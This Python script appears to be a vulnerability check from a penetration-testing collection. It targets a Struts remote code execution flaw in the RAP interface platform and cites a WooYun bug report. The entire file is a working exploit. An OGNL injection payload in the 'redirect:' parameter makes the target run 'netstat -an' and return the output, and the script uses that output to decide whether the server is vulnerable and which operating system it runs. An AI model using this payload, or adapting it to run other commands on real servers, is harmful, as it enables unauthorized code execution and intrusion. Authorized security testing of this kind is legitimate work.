#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: RAP接口平台struts远程代码执行
referer: http://www.wooyun.org/bugs/wooyun-2015-0159351
author: Lucifer
description: rap数据接口采用struts漏洞框架。
'''
import sys
import requests
import warnings
def run(url):
        result = ['RAP接口平台struts远程代码执行','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/org/index.do?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Active Internet connections" in req.text:
                result[2]=  '存在'
                result[1]=  vulnurl+"\t[Linux]"
                return result
            elif r"Active Connections" in req.text or r"活动连接" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\t[Windows]"
                return result
            elif r"LISTEN" in req.text:
                result[2] = '可能存在'
                result[1] = vulnurl
                return result
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
